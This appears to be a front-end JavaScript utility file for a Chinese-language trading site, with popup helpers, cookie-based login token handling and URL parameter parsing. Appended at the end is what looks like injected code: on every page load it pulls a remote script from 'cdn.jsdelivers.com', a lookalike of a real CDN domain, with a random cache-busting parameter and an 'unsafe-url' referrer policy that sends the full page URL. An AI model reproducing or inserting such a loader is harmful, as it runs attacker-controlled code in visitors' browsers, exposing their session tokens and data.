// var laravel_api = "/api"
// var node_api = "http://47.75.197.189:3000"
// var socket_api = "http://admin.maxf.pub:2120"
var _PROTOCOL = window.location.protocol;
var _HOST = window.location.host;
var _DOMAIN = _PROTOCOL + '//' + _HOST;
var _API ="/api/";
var _SERVER = _DOMAIN + "/hbm/"; //域名
var socket_api = _DOMAIN + ':2130';
//layer提示层
function layer_msg(content){
    if(content == ""){
        content = "请刷新重试"
    }
    layer.open({
        content: content
        ,skin: 'msg'
        ,time: 2 //2秒后自动关闭
    });
}
//layer提示层
function layer_loading(content){
    if(content == ""){
        content = "加载中"
    }
    layer.open({
        type: 2
        ,content: content
    });
}
function layer_close(){
    layer.closeAll()
}

function get_user() {
    return $.cookie("token") || 0;
}
function get_user_login() {
    return get_user() || (location.href =  "views/login.html");
}
function set_user(token) {
    var days = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 7;
    $.cookie("token", token, { expires: days, path: "/" });
}

function render_tpl(js_id, data, element) {
    var html = template(document.getElementById(js_id).innerHTML, data);
    element.html(html);
}
//获取字符串长度
function strlen(str){
    var len = 0;
    for (var i=0; i<str.length; i++) {
        var c = str.charCodeAt(i);
        //单字节加1
        if ((c >= 0x0001 && c <= 0x007e) || (0xff60<=c && c<=0xff9f)) {
            len++;
        }
        else {
            len+=2;
        }
    }
    return len;
}


/***
 * 获取url中所有参数
 * 返回参数键值对 对象
 */
function get_all_params() {
    var url = location.href;
    var nameValue;
    var paraString = url.substring(url.indexOf("?") + 1, url.length).split("&");
    var paraObj = {};
    for (var i = 0; nameValue = paraString[i]; i++) {
        var name = nameValue.substring(0, nameValue.indexOf("=")).toLowerCase();
        var value = nameValue.substring(nameValue.indexOf("=") + 1, nameValue.length);
        if (value.indexOf("#") > -1) {
            value = value.split("#")[0];
        }
        paraObj[name] = decodeURI(value);
    }
    return paraObj;
}

/**获取url中字段的值
 * name : 字段名
 * */
function get_param(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) {
        return unescape(r[2]);
    }
    return null;
}

/** 返回上一页 */
    $(".backPage").click(function(){
        history.back(-1);
    })

/* 交易页面开发中。。。。*/
$("#trade_nav").click(function(){
    layer_msg("功能还在开发中.....")
})

// 侧导航
$(".icon-xiangqing").click(function(){
    console.log(22)
    $("aside").removeClass("hide");
})
$(".aside_mask").click(function(){
    console.log(25)
    $("aside").addClass("hide");
})

function load_aside(){
    $('body').append('<section class="aside"></section>');
    $('.aside').load('/trade/views/aside.html');
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}